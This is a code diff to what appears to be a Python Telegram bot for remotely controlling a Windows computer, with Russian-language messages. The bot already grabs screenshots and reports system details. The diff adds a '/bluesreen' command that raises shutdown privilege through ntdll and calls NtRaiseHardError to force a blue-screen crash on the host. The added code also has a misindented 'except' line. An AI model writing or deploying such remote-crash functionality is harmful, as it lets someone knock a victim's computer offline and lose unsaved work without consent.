@@ -2,7 +2,8 @@ import random,telebot,os,webbrowser,pyautogui,time,requests,re
 from PIL import Image, ImageGrab
 from bs4 import BeautifulSoup
 from playsound import playsound
-
+from ctypes import *
+from ctypes.wintypes import *
 
 
 mytoken = 'telegram token'
@@ -128,7 +129,23 @@ def commands(message):
   
                 elif platform == "win32":
                         bot.send_message(message.chat.id,'oc: Windows\nИмя ПК: ' + socket.gethostname())
+                        
+                        
+                        
         
+        elif message.text == '/bluesreen':
+                try:
+                        tmp1 = c_bool()
+                        tmp2 = DWORD()
+                        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
+                        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
+                        bot.send_message(message.chat.id, 'Синий экран вкл')
+               
+               except:
+                        bot.send_message(message.chat.id, 'ошибка,не удалось вкл синий экран')
+                        
+        
+
         
 def get_record(message):
         global record
